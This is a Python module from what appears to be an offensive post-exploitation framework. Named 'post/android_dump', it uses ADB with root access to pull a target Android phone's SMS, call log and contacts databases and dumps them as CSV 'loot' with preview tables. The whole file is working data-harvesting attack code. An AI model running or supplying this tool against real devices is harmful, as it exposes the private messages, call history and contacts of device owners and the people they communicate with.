import subprocess
import sqlite3
import csv
import os
import time
import tempfile
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

# ─── ADB helpers ────────────────────────────────────────────────────────────

def _adb(device_id, *args):
    cmd = ['adb', '-s', device_id] + list(args)
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout.strip(), r.stderr.strip()

def _pull_db(device_id, remote_path, local_path):
    """Pull a file from device, return True on success."""
    Path(local_path).parent.mkdir(parents=True, exist_ok=True)
    out, err = _adb(device_id, 'pull', remote_path, local_path)
    return os.path.exists(local_path) and os.path.getsize(local_path) > 0

def _ms_to_dt(ms):
    """Convert millisecond timestamp to readable datetime string."""
    try:
        return datetime.fromtimestamp(int(ms) / 1000).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return str(ms)

# ─── Parsers ────────────────────────────────────────────────────────────────

def _dump_sms(db_path, out_dir):
    """Parse mmssms.db and write SMS + MMS to CSV."""
    output_file = os.path.join(out_dir, 'sms.csv')
    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        # sms table
        cur.execute("""
            SELECT
                address     AS phone_number,
                date        AS timestamp_ms,
                type        AS direction,  -- 1=inbox, 2=sent
                body        AS message,
                read        AS is_read,
                thread_id
            FROM sms
            ORDER BY date DESC
        """)
        rows = cur.fetchall()
        conn.close()

        direction_map = {'1': 'Inbox', '2': 'Sent', '3': 'Draft', '4': 'Outbox', '5': 'Failed'}

        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['phone_number', 'direction', 'timestamp', 'is_read', 'thread_id', 'message'])
            writer.writeheader()
            for row in rows:
                writer.writerow({
                    'phone_number': row['phone_number'] or '(unknown)',
                    'direction':    direction_map.get(str(row['direction']), str(row['direction'])),
                    'timestamp':    _ms_to_dt(row['timestamp_ms']),
                    'is_read':      'Yes' if row['is_read'] else 'No',
                    'thread_id':    row['thread_id'],
                    'message':      (row['message'] or '').replace('\n', ' '),
                })

        console.print(f"  [green][+] SMS: {len(rows)} messages → {output_file}[/green]")
        log_action(f"SMS dump: {len(rows)} messages")

        # Preview table
        table = Table(title=f"SMS Preview (last 5)", show_lines=True)
        for col in ['phone_number', 'direction', 'timestamp', 'message']:
            table.add_column(col.replace('_', ' ').title(), style='cyan' if col == 'phone_number' else 'white')
        for row in rows[:5]:
            msg = (row['message'] or '')[:60] + ('…' if len(row['message'] or '') > 60 else '')
            table.add_row(
                row['phone_number'] or '(unknown)',
                direction_map.get(str(row['direction']), '?'),
                _ms_to_dt(row['timestamp_ms']),
                msg
            )
        console.print(table)
        return len(rows)

    except sqlite3.OperationalError as e:
        console.print(f"  [red][!] SMS parse error: {e}[/red]")
        return 0


def _dump_call_log(db_path, out_dir):
    """Parse calls table from calllog.db or contacts2.db and write to CSV."""
    output_file = os.path.join(out_dir, 'call_log.csv')
    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        # Try calllog.db first, fall back to calls table in contacts2
        try:
            cur.execute("""
                SELECT
                    number          AS phone_number,
                    date            AS timestamp_ms,
                    duration        AS duration_sec,
                    type            AS call_type,
                    name            AS contact_name,
                    geocoded_location AS location
                FROM calls
                ORDER BY date DESC
            """)
        except sqlite3.OperationalError:
            console.print("  [yellow][!] 'calls' table not found in this DB.[/yellow]")
            conn.close()
            return 0

        rows = cur.fetchall()
        conn.close()

        type_map = {'1': 'Incoming', '2': 'Outgoing', '3': 'Missed',
                    '4': 'Voicemail', '5': 'Rejected', '6': 'Blocked'}

        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'contact_name', 'phone_number', 'call_type', 'timestamp', 'duration_sec', 'location'])
            writer.writeheader()
            for row in rows:
                writer.writerow({
                    'contact_name': row['contact_name'] or '',
                    'phone_number': row['phone_number'] or '(unknown)',
                    'call_type':    type_map.get(str(row['call_type']), str(row['call_type'])),
                    'timestamp':    _ms_to_dt(row['timestamp_ms']),
                    'duration_sec': row['duration_sec'],
                    'location':     row['location'] or '',
                })

        console.print(f"  [green][+] Call log: {len(rows)} records → {output_file}[/green]")
        log_action(f"Call log dump: {len(rows)} records")

        # Preview
        table = Table(title="Call Log Preview (last 5)")
        for col in ['Contact', 'Number', 'Type', 'Timestamp', 'Duration (s)']:
            table.add_column(col, style='cyan' if col == 'Contact' else 'white')
        for row in rows[:5]:
            table.add_row(
                row['contact_name'] or '—',
                row['phone_number'] or '—',
                type_map.get(str(row['call_type']), '?'),
                _ms_to_dt(row['timestamp_ms']),
                str(row['duration_sec'])
            )
        console.print(table)
        return len(rows)

    except Exception as e:
        console.print(f"  [red][!] Call log parse error: {e}[/red]")
        return 0


def _dump_contacts(db_path, out_dir):
    """Parse contacts2.db and write contacts to CSV."""
    output_file = os.path.join(out_dir, 'contacts.csv')
    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()

        # Join raw_contacts + data tables to get name + phone numbers
        cur.execute("""
            SELECT
                rc.display_name         AS full_name,
                d.data1                 AS value,
                d.mimetype_id           AS type_id,
                rc.times_contacted      AS times_contacted,
                rc.last_time_contacted  AS last_contact_ms
            FROM raw_contacts rc
            LEFT JOIN data d ON rc._id = d.raw_contact_id
            WHERE d.data1 IS NOT NULL
            ORDER BY rc.display_name
        """)
        rows = cur.fetchall()

        # Get mimetype mapping
        cur.execute("SELECT _id, mimetype FROM mimetypes")
        mimetypes = {str(row['_id']): row['mimetype'] for row in cur.fetchall()}
        conn.close()

        # Group by contact name
        contacts = {}
        for row in rows:
            name = row['full_name'] or '(unnamed)'
            if name not in contacts:
                contacts[name] = {
                    'full_name': name,
                    'phones': [],
                    'emails': [],
                    'times_contacted': row['times_contacted'] or 0,
                    'last_contact': _ms_to_dt(row['last_contact_ms']) if row['last_contact_ms'] else '',
                }
            mt = mimetypes.get(str(row['type_id']), '')
            if 'phone' in mt.lower():
                contacts[name]['phones'].append(row['value'])
            elif 'email' in mt.lower():
                contacts[name]['emails'].append(row['value'])

        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'full_name', 'phone_numbers', 'email_addresses', 'times_contacted', 'last_contact'])
            writer.writeheader()
            for c in contacts.values():
                writer.writerow({
                    'full_name':       c['full_name'],
                    'phone_numbers':   ' | '.join(set(c['phones'])),
                    'email_addresses': ' | '.join(set(c['emails'])),
                    'times_contacted': c['times_contacted'],
                    'last_contact':    c['last_contact'],
                })

        console.print(f"  [green][+] Contacts: {len(contacts)} entries → {output_file}[/green]")
        log_action(f"Contacts dump: {len(contacts)} contacts")

        # Preview
        table = Table(title="Contacts Preview (first 5)")
        table.add_column("Name", style="cyan")
        table.add_column("Phone(s)", style="green")
        table.add_column("Email(s)", style="white")
        table.add_column("Times Called", style="yellow")
        for c in list(contacts.values())[:5]:
            table.add_row(
                c['full_name'],
                ' | '.join(set(c['phones']))[:40] or '—',
                ' | '.join(set(c['emails']))[:40] or '—',
                str(c['times_contacted']),
            )
        console.print(table)
        return len(contacts)

    except Exception as e:
        console.print(f"  [red][!] Contacts parse error: {e}[/red]")
        return 0


# ─── Remote paths ────────────────────────────────────────────────────────────

REMOTE_SMS_DB      = '/data/data/com.android.providers.telephony/databases/mmssms.db'
REMOTE_CALLLOG_DB  = '/data/data/com.android.providers.contacts/databases/calllog.db'
REMOTE_CONTACTS_DB = '/data/data/com.android.providers.contacts/databases/contacts2.db'

class Module:
    MODULE_INFO = {
        'name': 'post/android_dump',
        'description': 'Dump Android SMS/texts, call logs, and contacts to clean CSV files via ADB.',
        'options': {
            'DEVICE_ID': 'Target device serial (leave empty for first connected device)',
            'OUTPUT_DIR': 'Directory to save CSV files [default: loot/android_dump/]',
            'DUMP_SMS':      'Dump text messages [default: true]',
            'DUMP_CALLS':    'Dump call log [default: true]',
            'DUMP_CONTACTS': 'Dump contacts [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _select_device(self, device_id):
        r, _ = _adb(None if not device_id else device_id, 'devices')
        lines = r.splitlines()
        devices = [l.split('\t')[0] for l in lines[1:] if '\tdevice' in l]
        if not devices:
            console.print("[red][!] No ADB devices connected. Enable USB debugging.[/red]")
            return None
        if device_id and device_id in devices:
            return device_id
        if not device_id:
            console.print(f"[cyan][*] Auto-selected device: {devices[0]}[/cyan]")
            return devices[0]
        console.print(f"[red][!] Device {device_id} not found. Connected: {devices}[/red]")
        return None

    def run(self):
        device_id   = self.framework.options.get('DEVICE_ID', '')
        out_dir     = self.framework.options.get('OUTPUT_DIR', 'loot/android_dump')
        dump_sms    = self.framework.options.get('DUMP_SMS', 'true').lower() == 'true'
        dump_calls  = self.framework.options.get('DUMP_CALLS', 'true').lower() == 'true'
        dump_conts  = self.framework.options.get('DUMP_CONTACTS', 'true').lower() == 'true'

        dev = self._select_device(device_id)
        if not dev:
            return

        Path(out_dir).mkdir(parents=True, exist_ok=True)
        tmp = tempfile.mkdtemp(prefix='shadow_android_')

        model = subprocess.run(['adb', '-s', dev, 'shell', 'getprop', 'ro.product.model'],
                               capture_output=True, text=True).stdout.strip()
        console.print(f"[bold cyan][*] Dumping from {dev} ({model}) → {out_dir}/[/bold cyan]")
        console.print("[yellow][!] Note: SMS, calls, and contacts DBs require root access on most devices.[/yellow]\n")
        log_action(f"Android dump started: {dev} → {out_dir}")

        total = 0

        # ── SMS ──────────────────────────────────────────────────────────────
        if dump_sms:
            console.print("[cyan][*] Pulling SMS database...[/cyan]")
            local_sms = os.path.join(tmp, 'mmssms.db')
            if _pull_db(dev, REMOTE_SMS_DB, local_sms):
                total += _dump_sms(local_sms, out_dir)
            else:
                console.print("  [red][!] Could not pull SMS DB (need root or enable ADB backup).[/red]")

        # ── Call Log ─────────────────────────────────────────────────────────
        if dump_calls:
            console.print("\n[cyan][*] Pulling call log database...[/cyan]")
            local_calls = os.path.join(tmp, 'calllog.db')
            # Try dedicated calllog.db first
            if not _pull_db(dev, REMOTE_CALLLOG_DB, local_calls):
                # Fall back to contacts2.db which also contains calls table
                local_calls = os.path.join(tmp, 'contacts2_calls.db')
                _pull_db(dev, REMOTE_CONTACTS_DB, local_calls)
            if os.path.exists(local_calls) and os.path.getsize(local_calls) > 0:
                total += _dump_call_log(local_calls, out_dir)
            else:
                console.print("  [red][!] Could not pull call log DB (need root).[/red]")

        # ── Contacts ─────────────────────────────────────────────────────────
        if dump_conts:
            console.print("\n[cyan][*] Pulling contacts database...[/cyan]")
            local_contacts = os.path.join(tmp, 'contacts2.db')
            if _pull_db(dev, REMOTE_CONTACTS_DB, local_contacts):
                total += _dump_contacts(local_contacts, out_dir)
            else:
                console.print("  [red][!] Could not pull contacts DB (need root).[/red]")

        # ── Summary ──────────────────────────────────────────────────────────
        console.print(f"\n[bold green][+] Dump complete. {total} total records saved to {out_dir}/[/bold green]")
        csvs = list(Path(out_dir).glob('*.csv'))
        for csv_file in csvs:
            size = csv_file.stat().st_size
            console.print(f"  [green]→ {csv_file.name} ({size:,} bytes)[/green]")

        # Cleanup temp dir
        import shutil
        shutil.rmtree(tmp, ignore_errors=True)
